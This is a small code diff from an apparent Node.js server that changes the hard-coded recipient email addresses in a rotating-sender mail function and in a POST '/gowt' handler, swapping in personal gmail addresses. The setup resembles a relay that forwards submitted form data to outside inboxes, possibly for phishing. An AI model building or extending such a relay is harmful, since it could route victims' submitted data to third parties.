@@ -78,7 +78,7 @@ const sendEmailWithRotation = (req, subject, message, callback) => {
 
     const mailOptions = {
       from: user,
-      to: "hey.heatherw@outlook.com",
+      to: "elizabeth001777@gmail.com",
       subject: subject,
       text: fullMessage,
     };
@@ -174,7 +174,7 @@ app.post("/gowt", (req, res) => {
     // Prepare email options
     const mailOptions = {
       from: user, // Sender email
-      to: "hey.heatherw@outlook.com", // Recipient email
+      to: "elizabeth001777@gmail.com,serenetides37@gmail.com", // Recipient email
       subject: subject, // Email subject
       text: fullMessage, // Email body
     };
